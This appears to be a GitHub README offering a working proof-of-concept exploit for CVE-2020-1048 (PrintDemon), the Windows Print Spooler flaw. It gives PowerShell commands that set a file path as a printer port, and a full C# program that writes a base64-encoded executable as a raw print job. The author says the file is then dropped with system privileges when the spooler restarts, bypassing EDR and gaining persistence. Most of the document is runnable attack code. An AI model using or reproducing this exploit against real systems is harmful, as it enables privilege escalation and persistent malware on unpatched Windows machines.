# PrintDemon

(CVE-2020-1048)

PrintDemon is a vulnerability which uses the Windows Printer Spooler to escalate privileges, bypass Endpoint Detection and Response (EDR) and gain persistence. The Windows Printer Spooler has a long history of vulnerabilities including a vulnerability (CVE-2010-2729) used by the well-known Malware called Stuxnet back in 2010.

What the vulnerability does is printing bytes to a printer port which you set as a file. So the bytes gets printed to the file which you set as a port.
Yarden Shafir & Alex Ionescu created an awesome blog about the bug called PrintDemon, but when I tested the the PowerShell commands, it dropped a file, but with some markup trash in it. I decided to create a PowerShell script which creates a print job and executes when the spooler service is restarted. This way you can use this script to drop a file (base64 encoded) using system privileges.

# How-to

Run the following commands in PowerShell and use the executable to drop calc.exe to the printer port location:

```
$printer = "PrintDemon"
$PrinterDriver = "Generic / Text Only"
$printerPort = "C:\Users\thalpius\Downloads\calc.exe"

Add-PrinterDriver -Name $PrinterDriver
Add-Printerport -name $printerPort
Add-Printer -Name $printer -DriverName $PrinterDriver -PortName $printerPort
```
**Note:** When you print to a file and restart the spooler service, the file gets dropped with system privileges.

# Source Code
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct DOCINFO
{
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pDocName;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pOutputFile;
    [MarshalAs(UnmanagedType.LPWStr)]
    public string pDataType;
}

public class PrintDirect
{
    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = false, CallingConvention = CallingConvention.StdCall)]
    public static extern long OpenPrinter(string pPrinterName, ref IntPtr phPrinter, int pDefault);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = false, CallingConvention = CallingConvention.StdCall)]
    public static extern long StartDocPrinter(IntPtr hPrinter, int Level, ref DOCINFO pDocInfo);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long StartPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long WritePrinter(IntPtr hPrinter, byte[] data, int buf, ref int pcWritten);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long EndPagePrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long EndDocPrinter(IntPtr hPrinter);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
    public static extern long ClosePrinter(IntPtr hPrinter);
}

namespace PrintDemon
{
    class Program
    {
        static void Main(string[] args)
        {
            string printerAddress = "PrintDemon";
            string base64 = "TVqQAAMAAAAEAAAA <SNIP> AAA";
            byte[] bytes = System.Convert.FromBase64String(base64);

            IntPtr printer = new IntPtr();
            int pcWritten = 0;
            DOCINFO docInfo = new DOCINFO
            {
                pDataType = "RAW"
            };

            PrintDirect.OpenPrinter(printerAddress, ref printer, 0);
            PrintDirect.StartDocPrinter(printer, 1, ref docInfo);
            PrintDirect.StartPagePrinter(printer);

            try
            {
                PrintDirect.WritePrinter(printer, bytes, bytes.Length, ref pcWritten);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            PrintDirect.EndPagePrinter(printer);
            PrintDirect.EndDocPrinter(printer);
            PrintDirect.ClosePrinter(printer);
        }
    }
}
```
